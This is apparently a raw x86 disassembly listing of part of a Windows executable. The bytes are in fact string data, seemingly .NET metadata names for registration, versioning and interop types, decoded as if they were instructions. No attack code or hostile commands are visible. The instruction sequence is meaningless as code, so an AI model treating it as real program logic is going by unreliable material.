  4072da:	jb     0x407341
  4072dc:	fs dec esp
  4072de:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  4072e5:	arpl   WORD PTR [ebx+0x65],cx
  4072e8:	jns    0x4072ea
  4072ea:	push   ebx
  4072eb:	push   0x64657261
  4072f0:	dec    esp
  4072f1:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  4072f8:	arpl   WORD PTR [ebx+0x65],cx
  4072fb:	jns    0x407351
  4072fd:	outs   dx,DWORD PTR ds:[esi]
  4072fe:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  407302:	push   ebx
  407303:	push   0x64657261
  407308:	dec    esp
  407309:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  407310:	arpl   WORD PTR [ebx+0x65],cx
  407313:	jns    0x40735b
  407315:	jne    0x407383
  407317:	ins    BYTE PTR es:[edi],dx
  407318:	add    BYTE PTR [ebx+0x79],dl
  40731b:	jae    0x407391
  40731d:	gs ins DWORD PTR es:[edi],dx
  40731f:	inc    ebx
  407320:	outs   dx,DWORD PTR ds:[esi]
  407321:	ins    DWORD PTR es:[edi],dx
  407322:	jo     0x407393
  407324:	outs   dx,BYTE PTR ds:[esi]
  407325:	outs   dx,BYTE PTR gs:[esi]
  407327:	je     0x407376
  407329:	outs   dx,DWORD PTR ds:[esi]
  40732a:	fs gs ins BYTE PTR es:[edi],dx
  40732d:	inc    esp
  40732e:	popa   
  40732f:	je     0x407392
  407331:	inc    ecx
  407332:	outs   dx,BYTE PTR ds:[esi]
  407333:	outs   dx,BYTE PTR ds:[esi]
  407334:	outs   dx,DWORD PTR ds:[esi]
  407335:	je     0x407398
  407337:	je     0x4073a2
  407339:	outs   dx,DWORD PTR ds:[esi]
  40733a:	outs   dx,BYTE PTR ds:[esi]
  40733b:	jae    0x40733d
  40733d:	push   ebx
  40733e:	jns    0x4073b3
  407340:	je     0x4073a7
  407342:	ins    DWORD PTR es:[edi],dx
  407343:	inc    ebx
  407344:	outs   dx,DWORD PTR ds:[esi]
  407345:	outs   dx,BYTE PTR ds:[esi]
  407346:	imul   sp,WORD PTR [edi+0x75],0x6172
  40734c:	je     0x4073b7
  40734e:	outs   dx,DWORD PTR ds:[esi]
  40734f:	outs   dx,BYTE PTR ds:[esi]
  407350:	add    BYTE PTR [ebx+0x79],dl
  407353:	jae    0x4073c9
  407355:	gs ins DWORD PTR es:[edi],dx
  407357:	inc    ebx
  407358:	outs   dx,DWORD PTR ds:[esi]
  407359:	outs   dx,BYTE PTR ds:[esi]
  40735a:	imul   sp,WORD PTR [edi+0x75],0x6172
  407360:	je     0x4073cb
  407362:	outs   dx,DWORD PTR ds:[esi]
  407363:	outs   dx,BYTE PTR ds:[esi]
  407364:	dec    ecx
  407365:	outs   dx,BYTE PTR ds:[esi]
  407366:	jae    0x4073dc
  407368:	popa   
  407369:	ins    BYTE PTR es:[edi],dx
  40736a:	ins    BYTE PTR es:[edi],dx
  40736b:	add    BYTE PTR [ebx+0x79],dl
  40736e:	jae    0x4073e4
  407370:	gs ins DWORD PTR es:[edi],dx
  407372:	inc    esp
  407373:	gs jo  0x4073e2
  407376:	outs   dx,DWORD PTR ds:[esi]
  407377:	jns    0x4073e6
  407379:	outs   dx,BYTE PTR gs:[esi]
  40737b:	je     0x40737d
  40737d:	push   ebx
  40737e:	jns    0x4073f3
  407380:	je     0x4073e7
  407382:	ins    DWORD PTR es:[edi],dx
  407383:	inc    esp
  407384:	gs jae 0x4073f0
  407387:	outs   dx,BYTE PTR ds:[si]
  407389:	add    BYTE PTR [ebx+0x79],dl
  40738c:	jae    0x407402
  40738e:	gs ins DWORD PTR es:[edi],dx
  407390:	inc    esp
  407391:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407398:	jns    0x4073ed
  40739a:	gs jb  0x407413
  40739d:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4073a4:	jae    0x40741a
  4073a6:	gs ins DWORD PTR es:[edi],dx
  4073a8:	inc    esp
  4073a9:	jb     0x40740c
  4073ab:	ja     0x407416
  4073ad:	outs   dx,BYTE PTR ds:[esi]
  4073ae:	addr16 inc esp
  4073b0:	gs jae 0x40741c
  4073b3:	outs   dx,BYTE PTR ds:[si]
  4073b5:	add    BYTE PTR [ebx+0x79],dl
  4073b8:	jae    0x40742e
  4073ba:	gs ins DWORD PTR es:[edi],dx
  4073bc:	inc    esp
  4073bd:	jb     0x407420
  4073bf:	ja     0x40742a
  4073c1:	outs   dx,BYTE PTR ds:[esi]
  4073c2:	add    BYTE PTR [bp+di+0x79],dl
  4073c6:	jae    0x40743c
  4073c8:	gs ins DWORD PTR es:[edi],dx
  4073ca:	inc    ebp
  4073cb:	outs   dx,BYTE PTR ds:[esi]
  4073cc:	je     0x407433
  4073ce:	jb     0x407440
  4073d0:	jb     0x40743b
  4073d2:	jae    0x407439
  4073d4:	push   ebx
  4073d5:	gs jb  0x40744e
  4073d8:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4073df:	jae    0x407455
  4073e1:	gs ins DWORD PTR es:[edi],dx
  4073e3:	dec    ebp
  4073e4:	popa   
  4073e5:	outs   dx,BYTE PTR ds:[esi]
  4073e6:	popa   
  4073e7:	gs ins DWORD PTR es:[di],dx
  4073ea:	outs   dx,BYTE PTR gs:[esi]
  4073ec:	je     0x4073ee
  4073ee:	push   ebx
  4073ef:	jns    0x407464
  4073f1:	je     0x407458
  4073f3:	ins    DWORD PTR es:[edi],dx
  4073f4:	dec    ebp
  4073f5:	gs jae 0x40746b
  4073f8:	popa   
  4073f9:	imul   ebp,DWORD PTR [bp+0x67],0x73795300
  407401:	je     0x407468
  407403:	ins    DWORD PTR es:[edi],dx
  407404:	push   edx
  407405:	jne    0x407475
  407407:	je     0x407472
  407409:	ins    DWORD PTR es:[edi],dx
  40740a:	gs push ebx
  40740c:	gs jb  0x407478
  40740f:	popa   
  407410:	ins    BYTE PTR es:[edi],dx
  407411:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  407418:	inc    esi
  407419:	outs   dx,DWORD PTR ds:[esi]
  40741a:	jb     0x407489
  40741c:	popa   
  40741d:	je     0x407493
  40741f:	gs jb  0x407495
  407422:	push   ebx
  407423:	outs   dx,DWORD PTR ds:[esi]
  407424:	popa   
  407425:	jo     0x407427
  407427:	push   ebx
  407428:	jns    0x40749d
  40742a:	je     0x407491
  40742c:	ins    DWORD PTR es:[edi],dx
  40742d:	push   ebx
  40742e:	arpl   WORD PTR gs:[ebp+0x72],si
  407432:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  40743a:	gs ins DWORD PTR es:[edi],dx
  40743c:	push   ebx
  40743d:	gs jb  0x4074b6
  407440:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  407447:	gs jae 0x4074bd
  40744a:	add    BYTE PTR [ebx+0x79],dl
  40744d:	jae    0x4074c3
  40744f:	gs ins DWORD PTR es:[edi],dx
  407451:	push   edi
  407452:	bound  eax,QWORD PTR gs:[eax]
  407455:	push   ebx
  407456:	jns    0x4074cb
  407458:	je     0x4074bf
  40745a:	ins    DWORD PTR es:[edi],dx
  40745b:	push   edi
  40745c:	bound  eax,QWORD PTR gs:[ecx+0x62]
  407460:	jae    0x4074d6
  407462:	jb     0x4074c5
  407464:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  407468:	outs   dx,BYTE PTR ds:[esi]
  407469:	jae    0x40746b
  40746b:	push   ebx
  40746c:	jns    0x4074e1
  40746e:	je     0x4074d5
  407470:	ins    DWORD PTR es:[edi],dx
  407471:	push   edi
  407472:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  407477:	popa   
  407478:	ins    DWORD PTR es:[edi],dx
  407479:	imul   esp,DWORD PTR [ebx+0x44],0x617461
  407480:	push   ebx
  407481:	jns    0x4074f6
  407483:	je     0x4074ea
  407485:	ins    DWORD PTR es:[edi],dx
  407486:	push   edi
  407487:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  40748c:	popa   
  40748d:	ins    DWORD PTR es:[edi],dx
  40748e:	imul   esp,DWORD PTR [ebx+0x44],0x44617461
  407495:	gs jae 0x407501
  407498:	outs   dx,BYTE PTR ds:[si]
  40749a:	add    BYTE PTR [ebx+0x79],dl
  40749d:	jae    0x407513
  40749f:	gs ins DWORD PTR es:[edi],dx
  4074a1:	push   edi
  4074a2:	bound  eax,QWORD PTR gs:[ebp+0x6e]
  4074a6:	je     0x407511
  4074a8:	je     0x407523
  4074aa:	inc    esp
  4074ab:	gs jae 0x407517
  4074ae:	outs   dx,BYTE PTR ds:[si]
  4074b0:	add    BYTE PTR [ebx+0x79],dl
  4074b3:	jae    0x407529
  4074b5:	gs ins DWORD PTR es:[edi],dx
  4074b7:	push   edi
  4074b8:	bound  eax,QWORD PTR gs:[ebp+0x78]
  4074bc:	je     0x407523
  4074be:	outs   dx,BYTE PTR ds:[esi]
  4074bf:	jae    0x40752a
  4074c1:	outs   dx,DWORD PTR ds:[esi]
  4074c2:	outs   dx,BYTE PTR ds:[esi]
  4074c3:	jae    0x4074c5
  4074c5:	push   ebx
  4074c6:	jns    0x40753b
  4074c8:	je     0x40752f
  4074ca:	ins    DWORD PTR es:[edi],dx
  4074cb:	push   edi
  4074cc:	bound  eax,QWORD PTR gs:[ebp+0x78]
  4074d0:	je     0x407537
  4074d2:	outs   dx,BYTE PTR ds:[esi]
  4074d3:	jae    0x40753e
  4074d5:	outs   dx,DWORD PTR ds:[esi]
  4074d6:	outs   dx,BYTE PTR ds:[esi]
  4074d7:	jae    0x40751d
  4074d9:	gs jae 0x407545
  4074dc:	outs   dx,BYTE PTR ds:[si]
  4074de:	add    BYTE PTR [ebx+0x79],dl
  4074e1:	jae    0x407557
  4074e3:	gs ins DWORD PTR es:[edi],dx
  4074e5:	push   edi
  4074e6:	bound  ecx,QWORD PTR gs:[ebp+0x6f]
  4074ea:	bound  ebp,QWORD PTR [ecx+0x6c]
  4074ed:	add    BYTE PTR gs:[ebx+0x79],dl
  4074f1:	jae    0x407567
  4074f3:	gs ins DWORD PTR es:[edi],dx
  4074f5:	push   edi
  4074f6:	bound  edx,QWORD PTR gs:[edx+0x65]
  4074fa:	addr16 jne 0x407569
  4074fd:	popa   
  4074fe:	jb     0x407545
  407500:	js     0x407572
  407502:	jb     0x407569
  407504:	jae    0x407579
  407506:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  40750d:	jae    0x407583
  40750f:	gs ins DWORD PTR es:[edi],dx
  407511:	push   edi
  407512:	bound  edx,QWORD PTR gs:[edx+0x6f]
  407516:	jne    0x40758c
  407518:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40751f:	je     0x407586
  407521:	ins    DWORD PTR es:[edi],dx
  407522:	push   edi
  407523:	bound  edx,QWORD PTR gs:[ebx+0x65]
  407527:	jb     0x40759f
  407529:	imul   esp,DWORD PTR [ebx+0x65],0x694d0073
  407530:	arpl   WORD PTR [edx+0x6f],si
  407533:	jae    0x4075a4
  407535:	data16 je 0x40758e
  407538:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40753f:	jne    0x4075a5
  407541:	imul   ebp,DWORD PTR [edi+0x0],0x7263694d
  407548:	outs   dx,DWORD PTR ds:[esi]
  407549:	jae    0x4075ba
  40754b:	data16 je 0x4075a4
  40754e:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  407555:	jne    0x4075bb
  407557:	imul   ebp,DWORD PTR [edi+0x57],0x6f646e69
  40755e:	ja     0x4075d3
  407560:	inc    esi
  407561:	outs   dx,DWORD PTR ds:[esi]
  407562:	jb     0x4075d1
  407564:	jae    0x407566
  407566:	push   esi
  407567:	dec    edx
  407568:	push   ebx
  407569:	push   0x43707261
  40756e:	outs   dx,DWORD PTR ds:[esi]
  40756f:	fs gs push eax
  407572:	jb     0x4075e3
  407574:	jbe    0x4075df
  407576:	fs gs jb 0x40757a
  40757a:	inc    ecx
  40757b:	push   ebx
  40757c:	push   eax
  40757d:	inc    edx
  40757e:	jb     0x4075ef
  407580:	ja     0x4075f5
  407582:	gs jb  0x4075c8
  407585:	popa   
  407586:	jo     0x4075fb
  407588:	push   eax
  407589:	jne    0x4075ed
  40758b:	ins    BYTE PTR es:[edi],dx
  40758c:	imul   esp,DWORD PTR [ebx+0x4b],0x41007965
  407593:	push   ebx
  407594:	push   eax
  407595:	inc    edx
  407596:	jb     0x407607
  407598:	ja     0x40760d
  40759a:	gs jb  0x4075e0
  40759d:	popa   
  40759e:	jo     0x407613
  4075a0:	inc    esi
  4075a1:	popa   
  4075a2:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4075a6:	jns    0x4075a8
  4075a8:	dec    ebp
  4075a9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4075b0:	je     0x407608
  4075b2:	push   ebx
  4075b3:	inc    esp
  4075b4:	gs jae 0x407620
  4075b7:	outs   dx,BYTE PTR ds:[si]
  4075b9:	gs jb  0x4075bc
  4075bc:	dec    ebp
  4075bd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4075c4:	je     0x40761c
  4075c6:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4075cd:	jne    0x407633
  4075cf:	imul   ebp,DWORD PTR [edi+0x57],0x4d006265
  4075d6:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4075dd:	je     0x407636
  4075df:	bound  eax,QWORD PTR gs:[ebp+eiz*2+0x73]
  4075e4:	imul   esp,DWORD PTR [edi+0x6e],0x63694d00
  4075eb:	jb     0x40765c
  4075ed:	jae    0x40765e
  4075ef:	data16 je 0x407648
  4075f2:	push   ebx
  4075f3:	inc    esp
  4075f4:	gs jae 0x407660
  4075f7:	outs   dx,BYTE PTR ds:[si]
  4075f9:	gs jb  0x407649
  4075fc:	outs   dx,DWORD PTR ds:[esi]
  4075fd:	bound  ebp,QWORD PTR [ecx+0x6c]
  407600:	add    BYTE PTR gs:[ebp+0x69],cl
  407604:	arpl   WORD PTR [edx+0x6f],si
  407607:	jae    0x407678
  407609:	data16 je 0x407656
  40760c:	push   ebx
  40760d:	arpl   WORD PTR [edx+0x69],si
  407610:	jo     0x407686
  407612:	add    BYTE PTR [ebx+0x79],dl
  407615:	jae    0x40768b
  407617:	gs ins DWORD PTR es:[edi],dx
  407619:	cs push edx
  40761b:	gs jae 0x40768d
  40761e:	jne    0x407692
  407620:	arpl   WORD PTR [ebp+0x73],sp
  407623:	add    BYTE PTR [edx+0x65],dl
  407626:	jae    0x407697
  407628:	jne    0x40769c
  40762a:	arpl   WORD PTR [ebp+0x4d],sp
  40762d:	popa   
  40762e:	outs   dx,BYTE PTR ds:[esi]
  40762f:	popa   
  407630:	addr16 gs jb 0x407634
  407634:	pop    edi
  407635:	jb     0x40769c
  407637:	jae    0x4076a6
  407639:	addr16 jb 0x40763c
  40763c:	dec    ecx
  40763d:	outs   dx,BYTE PTR ds:[esi]
  40763e:	imul   esi,DWORD PTR [edx+edx*2+0x65],0x72756f73
  407646:	arpl   WORD PTR [ebp+0x4d],sp
  407649:	popa   
  40764a:	outs   dx,BYTE PTR ds:[esi]
  40764b:	popa   
  40764c:	addr16 gs jb 0x407650
  407650:	inc    edi
  407651:	gs je  0x4076a7
  407654:	je     0x4076c8
  407656:	imul   ebp,DWORD PTR [esi+0x67],0x74654700
  40765d:	push   ebx
  40765e:	je     0x4076d2
  407660:	imul   ebp,DWORD PTR [esi+0x67],0x78456649
  407667:	imul   esi,DWORD PTR [ebx+0x74],0x6f460073
  40766e:	jb     0x4076dd
  407670:	popa   
  407671:	je     0x4076c6
  407673:	je     0x4076e7
  407675:	imul   ebp,DWORD PTR [esi+0x67],0x74632e00
  40767c:	outs   dx,DWORD PTR ds:[esi]
  40767d:	jb     0x40767f
  40767f:	push   ebx
  407680:	jne    0x4076e5
  407682:	arpl   WORD PTR [ebp+0x73],sp
  407685:	jae    0x4076d9
  407687:	gs je  0x4076ff
  40768a:	jb     0x4076fa
  40768c:	inc    ebx
  40768d:	outs   dx,DWORD PTR ds:[esi]
  40768e:	fs add BYTE PTR gs:[ebp+0x72],al
  407693:	jb     0x407704
  407695:	jb     0x4076e9
  407697:	gs je  0x40770f
  40769a:	jb     0x40770a
  40769c:	inc    ebx
  40769d:	outs   dx,DWORD PTR ds:[esi]
  40769e:	fs add BYTE PTR gs:[ebp+0x41],cl
  4076a3:	pop    eax
  4076a4:	pop    edi
  4076a5:	push   eax
  4076a6:	inc    ecx
  4076a7:	push   esp
  4076a8:	dec    eax
  4076a9:	add    BYTE PTR [ebp+0x61],cl
  4076ac:	imul   ebp,DWORD PTR [esi+0x0],0x6e7552
  4076b3:	push   ebx
  4076b4:	gs je  0x4076fa
  4076b7:	outs   dx,DWORD PTR ds:[esi]
  4076b8:	outs   dx,BYTE PTR ds:[esi]
  4076b9:	jae    0x40772a
  4076bb:	ins    BYTE PTR es:[edi],dx
  4076bc:	gs push ebp
  4076be:	dec    ecx
  4076bf:	add    BYTE PTR [edi+0x65],al
  4076c2:	je     0x40770a
  4076c4:	jne    0x407732
  4076c6:	ins    BYTE PTR es:[edi],dx
  4076c7:	push   eax
  4076c8:	popa   
  4076c9:	je     0x407733
  4076cb:	add    BYTE PTR [edi+0x65],al
  4076ce:	je     0x407711
  4076d0:	bound  esi,QWORD PTR [ebx+0x6f]
  4076d3:	ins    BYTE PTR es:[edi],dx
  4076d4:	jne    0x40774a
  4076d6:	gs push eax
  4076d8:	popa   
  4076d9:	je     0x407743
  4076db:	add    BYTE PTR [eax+0x61],dl
  4076de:	jb     0x407753
  4076e0:	gs inc ecx
  4076e2:	jb     0x40774b
  4076e4:	jne    0x407753
  4076e6:	outs   dx,BYTE PTR gs:[esi]
  4076e8:	je     0x40775d
  4076ea:	add    BYTE PTR [eax+0x72],dl
  4076ed:	imul   ebp,DWORD PTR [esi+0x74],0x6f676f4c
  4076f4:	add    BYTE PTR [eax+0x72],dl
  4076f7:	imul   ebp,DWORD PTR [esi+0x74],0x67617355
  4076fe:	add    BYTE PTR gs:[ebx+0x79],dl
  407702:	jae    0x407778
  407704:	gs ins DWORD PTR es:[edi],dx
  407706:	cs push esp
  407708:	gs js  0x40777f
  40770b:	add    BYTE PTR [ebx+0x74],dl
  40770e:	jb     0x407779
  407710:	outs   dx,BYTE PTR ds:[esi]
  407711:	addr16 inc edx
  407713:	jne    0x40777e
  407715:	ins    BYTE PTR es:[edi],dx
  407716:	fs gs jb 0x40771a
  40771a:	push   ebx
  40771b:	gs popa 
  40771d:	jb     0x407782
  40771f:	push   0x68746150
  407724:	add    BYTE PTR [ebx+0x65],dl
  407727:	je     0x40776e
  407729:	outs   dx,BYTE PTR ds:[esi]
  40772a:	jbe    0x407795
  40772c:	jb     0x40779d
  40772e:	outs   dx,BYTE PTR ds:[esi]
  40772f:	ins    DWORD PTR es:[edi],dx
  407730:	outs   dx,BYTE PTR gs:[esi]
  407732:	je     0x40778a
  407734:	popa   
  407735:	jb     0x4077a0
  407737:	popa   
  407738:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40773c:	jae    0x40779d
  40773e:	dec    edi
  40773f:	jo     0x4077b5
  407741:	imul   ebp,DWORD PTR [edi+0x6e],0x5f6d0073
  407748:	jae    0x4077be
  40774a:	jb     0x40779a
  40774c:	popa   
  40774d:	ins    DWORD PTR es:[edi],dx
  40774e:	add    BYTE PTR gs:[ebp+0x5f],ch
  407752:	jae    0x4077c8
  407754:	jb     0x4077ac
  407756:	popa   
  407757:	ins    BYTE PTR es:[edi],dx
  407758:	jne    0x4077bf
  40775a:	add    BYTE PTR [edi+0x65],ah
  40775d:	je     0x4077be
  40775f:	dec    esi
  407760:	popa   
  407761:	ins    DWORD PTR es:[edi],dx
  407762:	add    BYTE PTR gs:[edi+0x65],ah
  407766:	je     0x4077c7
  407768:	push   esi
  407769:	popa   
  40776a:	ins    BYTE PTR es:[edi],dx
  40776b:	jne    0x4077d2
  40776d:	add    BYTE PTR [esi+0x61],cl
  407770:	ins    DWORD PTR es:[edi],dx
  407771:	add    BYTE PTR gs:[esi+0x61],dl
  407775:	ins    BYTE PTR es:[edi],dx
  407776:	jne    0x4077dd
  407778:	add    BYTE PTR [ebp+0x5f],ch
  40777b:	popa   
  40777c:	dec    edi
  40777d:	jo     0x4077f3
  40777f:	imul   ebp,DWORD PTR [edi+0x6e],0x5f6d0073
  407786:	bound  edx,QWORD PTR [edx+0x65]
  407789:	jno    0x407800
  40778b:	imul   esi,DWORD PTR [edx+0x65],0x6c615673
  407792:	jne    0x4077f9
  407794:	add    BYTE PTR [ebp+0x5f],ch
  407797:	bound  eax,QWORD PTR [ebx+0x61]
  40779a:	outs   dx,BYTE PTR ds:[esi]
  40779b:	dec    eax
  40779c:	popa   
  40779d:	jbe    0x407804
  40779f:	push   esi
  4077a0:	popa   
  4077a1:	ins    BYTE PTR es:[edi],dx
  4077a2:	jne    0x407809
  4077a4:	add    BYTE PTR [edi+ebp*2+0x6f],cl
  4077a8:	imul   esi,DWORD PTR [ebp+0x70],0x0
  4077ac:	ins    DWORD PTR es:[edi],dx
  4077ad:	pop    edi
  4077ae:	popa   
  4077af:	inc    ecx
  4077b0:	jb     0x407819
  4077b2:	dec    esp
  4077b3:	imul   esi,DWORD PTR [ebx+0x74],0x615f6d00
  4077ba:	dec    edi
  4077bb:	jo     0x407831
  4077bd:	dec    esp
  4077be:	imul   esi,DWORD PTR [ebx+0x74],0x695f6d00
  4077c5:	inc    ecx
  4077c6:	jb     0x40782f
  4077c8:	inc    ebx
  4077c9:	jne    0x40783d
  4077cb:	jae    0x40783c
  4077cd:	jb     0x4077cf
  4077cf:	ins    DWORD PTR es:[edi],dx
  4077d0:	pop    edi
  4077d1:	imul   ecx,DWORD PTR [edi+0x70],0x72754374
  4077d8:	jae    0x407849
  4077da:	jb     0x4077dc
  4077dc:	ins    DWORD PTR es:[edi],dx
  4077dd:	pop    edi
  4077de:	jae    0x407836
  4077e0:	popa   
  4077e1:	ins    BYTE PTR es:[edi],dx
  4077e2:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x6e6f6974
  4077ea:	jae    0x4077ec
  4077ec:	addr16 gs je 0x40784f
  4077f0:	dec    esi
  4077f1:	jne    0x407860
  4077f3:	inc    ecx
  4077f4:	jb     0x40785d
  4077f6:	jae    0x4077f8
  4077f8:	addr16 gs je 0x40785b
  4077fc:	dec    esi
  4077fd:	jne    0x40786c
  4077ff:	dec    edi
  407800:	jo     0x407876
  407802:	jae    0x407804
  407804:	inc    edi
  407805:	gs je  0x407856
  407808:	gs js  0x40787f
  40780b:	inc    ecx
  40780c:	jb     0x407875
  40780e:	add    BYTE PTR [edi+0x65],al
  407811:	je     0x407861
  407813:	gs js  0x40788a
  407816:	dec    edi
  407817:	jo     0x40788d
  407819:	imul   ebp,DWORD PTR [edi+0x6e],0x6d754e00
  407820:	inc    ecx
  407821:	jb     0x40788a
  407823:	jae    0x407825
  407825:	dec    esi
  407826:	jne    0x407895
  407828:	dec    edi
  407829:	jo     0x40789f
  40782b:	jae    0x40782d
  40782d:	push   esp
  40782e:	jns    0x4078a0
  407830:	gs dec esp
  407832:	imul   esp,DWORD PTR [edx+0x45],0x726f7078
  407839:	je     0x4078a0
  40783b:	jb     0x407883
  40783d:	ins    BYTE PTR es:[edi],dx
  40783e:	popa   
  40783f:	addr16 jae 0x407842
  407842:	jbe    0x4078a5
  407844:	ins    BYTE PTR es:[edi],dx
  407845:	jne    0x4078ac
  407847:	pop    edi
  407848:	pop    edi
  407849:	add    BYTE PTR [edx+0x45],dl
  40784c:	inc    edi
  40784d:	dec    ebx
  40784e:	dec    ecx
  40784f:	dec    esi
  407850:	inc    esp
  407851:	pop    edi
  407852:	inc    esp
  407853:	inc    ebp
  407854:	inc    esi
  407855:	inc    ecx
  407856:	push   ebp
  407857:	dec    esp
  407858:	push   esp
  407859:	add    BYTE PTR [edx+0x45],dl
  40785c:	inc    edi
  40785d:	dec    ebx
  40785e:	dec    ecx
  40785f:	dec    esi
  407860:	inc    esp
  407861:	pop    edi
  407862:	push   edx
  407863:	inc    ebp
  407864:	inc    edi
  407865:	dec    ecx
  407866:	push   ebx
  407867:	push   esp
  407868:	inc    ebp
  407869:	push   edx
  40786a:	add    BYTE PTR [edx+0x45],dl
  40786d:	inc    edi
  40786e:	dec    ebx
  40786f:	dec    ecx
  407870:	dec    esi
  407871:	inc    esp
  407872:	pop    edi
  407873:	dec    esi
  407874:	dec    edi
  407875:	dec    esi
  407876:	inc    ebp
  407877:	add    BYTE PTR [edx+0x45],dl
  40787a:	inc    edi
  40787b:	dec    ebx
  40787c:	dec    ecx
  40787d:	dec    esi
  40787e:	inc    esp
  40787f:	pop    edi
  407880:	dec    esp
  407881:	dec    edi
  407882:	inc    ecx
  407883:	inc    esp
  407884:	pop    edi
  407885:	push   esp
  407886:	dec    esp
  407887:	inc    edx
  407888:	pop    edi
  407889:	inc    ecx
  40788a:	push   ebx
  40788b:	pop    edi
  40788c:	xor    esi,DWORD PTR [edx]
  40788e:	inc    edx
  40788f:	dec    ecx
  407890:	push   esp
  407891:	add    BYTE PTR [edx+0x45],dl
  407894:	inc    edi
  407895:	dec    ebx
  407896:	dec    ecx
  407897:	dec    esi
  407898:	inc    esp
  407899:	pop    edi
  40789a:	dec    esp
  40789b:	dec    edi
  40789c:	inc    ecx
  40789d:	inc    esp
  40789e:	pop    edi
  40789f:	push   esp
  4078a0:	dec    esp
  4078a1:	inc    edx
  4078a2:	pop    edi
  4078a3:	inc    ecx
  4078a4:	push   ebx
  4078a5:	pop    edi
  4078a6:	ss xor al,0x42
  4078a9:	dec    ecx
  4078aa:	push   esp
  4078ab:	add    BYTE PTR [edi+0x75],al
  4078ae:	imul   esp,DWORD PTR [eax+eax*1+0x45],0x6c617571
  4078b6:	jae    0x4078b8
  4078b8:	inc    edi
  4078b9:	gs je  0x407904
  4078bc:	popa   
  4078bd:	jae    0x407927
  4078bf:	inc    ebx
  4078c0:	outs   dx,DWORD PTR ds:[esi]
  4078c1:	fs add BYTE PTR gs:[edi+0x65],ah
  4078c6:	je     0x407927
  4078c8:	push   esp
  4078c9:	ins    BYTE PTR es:[edi],dx
  4078ca:	bound  ecx,QWORD PTR [ecx+0x44]
  4078cd:	add    BYTE PTR [edi+0x65],ah
  4078d0:	je     0x407931
  4078d2:	dec    ebp
  4078d3:	popa   
  4078d4:	push   0x6f
  4078d6:	jb     0x40792e
  4078d8:	gs jb  0x40794e
  4078db:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4078e2:	pop    edi
  4078e3:	dec    ebp
  4078e4:	imul   ebp,DWORD PTR [esi+0x6f],0x72655672
  4078eb:	jae    0x407956
  4078ed:	outs   dx,DWORD PTR ds:[esi]
  4078ee:	outs   dx,BYTE PTR ds:[esi]
  4078ef:	add    BYTE PTR [esp+ebp*2+0x62],dh
  4078f3:	imul   esp,DWORD PTR [eax+eax*1+0x6d],0x726f6a61
  4078fb:	push   esi
  4078fc:	gs jb  0x407972
  4078ff:	imul   ebp,DWORD PTR [edi+0x6e],0x6e696d00
  407906:	outs   dx,DWORD PTR ds:[esi]
  407907:	jb     0x40795f
  407909:	gs jb  0x40797f
  40790c:	imul   ebp,DWORD PTR [edi+0x6e],0x626c5400
  407913:	dec    ecx
  407914:	inc    esp
  407915:	add    BYTE PTR [ebp+0x61],cl
  407918:	push   0x6f
  40791a:	jb     0x407972
  40791c:	gs jb  0x407992
  40791f:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  407926:	outs   dx,DWORD PTR ds:[esi]
  407927:	jb     0x40797f
  407929:	gs jb  0x40799f
  40792c:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  407933:	pop    edi
  407934:	inc    esi
  407935:	jne    0x4079a3
  407937:	ins    BYTE PTR es:[edi],dx
  407938:	push   esp
  407939:	ins    BYTE PTR es:[edi],dx
  40793a:	bound  ecx,QWORD PTR [esi+0x61]
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	add    BYTE PTR gs:[ebx+0x79],dl
  407942:	jae    0x4079b8
  407944:	gs ins DWORD PTR es:[edi],dx
  407946:	cs push edx
  407948:	jne    0x4079b8
  40794a:	je     0x4079b5
  40794c:	ins    DWORD PTR es:[edi],dx
  40794d:	gs cs dec ecx
  407950:	outs   dx,BYTE PTR ds:[esi]
  407951:	je     0x4079b8
  407953:	jb     0x4079c4
  407955:	jo     0x4079aa
  407957:	gs jb  0x4079d0
  40795a:	imul   esp,DWORD PTR [ebx+0x65],0x6f432e73
  407961:	ins    DWORD PTR es:[edi],dx
  407962:	push   esp
  407963:	jns    0x4079d5
  407965:	gs jae 0x407968
  407968:	dec    ecx
  407969:	push   esp
  40796a:	jns    0x4079dc
  40796c:	gs dec esp
  40796e:	imul   esp,DWORD PTR [edx+0x0],0x5f746567
  407975:	push   esp
  407976:	ins    BYTE PTR es:[edi],dx
  407977:	bound  eax,QWORD PTR [eax]
  407979:	jae    0x4079e0
  40797b:	je     0x4079dc
  40797d:	push   esp
  40797e:	ins    BYTE PTR es:[edi],dx
  40797f:	bound  eax,QWORD PTR [eax]
  407981:	je     0x4079ef
  407983:	bound  eax,QWORD PTR [esi+0x75]
  407986:	ins    BYTE PTR es:[edi],dx
  407987:	ins    BYTE PTR es:[edi],dx
  407988:	dec    esi
  407989:	popa   
  40798a:	ins    DWORD PTR es:[edi],dx
  40798b:	add    BYTE PTR gs:[esp+ebp*2+0x62],dh
  407990:	add    BYTE PTR [esi+0x75],al
  407993:	ins    BYTE PTR es:[edi],dx
  407994:	ins    BYTE PTR es:[edi],dx
  407995:	push   esp
  407996:	ins    BYTE PTR es:[edi],dx
